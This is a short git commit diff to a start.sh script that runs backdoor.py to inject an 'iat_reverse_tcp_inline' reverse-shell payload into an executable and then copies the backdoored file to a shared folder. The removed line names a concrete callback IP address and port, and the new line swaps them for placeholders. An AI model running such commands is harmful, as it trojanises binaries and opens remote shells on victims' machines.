fe03a4b602d6fbd2bdf203002e82c3c12168ad10
Francesco Palazzo <francesco@palazzo.me>
2021-02-05 08:56:56 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 
-./backdoor.py -f shared-vol/backdoor.exe -s iat_reverse_tcp_inline -H 95.247.171.107 -P 43231
+./backdoor.py -f shared-vol/backdoor.exe -s iat_reverse_tcp_inline -H <ip> -P <port>
 mv backdoored/backdoor.exe shared-vol/backdoored.exe
